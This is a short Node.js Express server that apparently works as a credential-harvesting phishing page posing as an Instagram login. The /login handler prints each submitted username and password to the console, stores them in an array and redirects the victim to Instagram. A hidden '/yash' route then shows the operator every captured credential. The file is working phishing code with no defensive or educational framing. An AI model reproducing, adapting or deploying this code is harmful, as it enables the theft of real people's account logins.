const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;
//yash
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.use(express.static('public'));

app.get('/', (req, res) => {
    res.render('index.ejs');
});
let details = [];
app.post('/login', (req, res) => {
    const {username, Password} = req.body;
    const user = req.body.username;
    const pass = req.body.Password;
    console.log(user); 
    console.log(pass);
    details.push({ username: user, password: pass });
    res.redirect("www.instagram.com");
});
app.get('/yash', (req, res) => {
    res.render('loginDetails', { user: details });
});


app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});
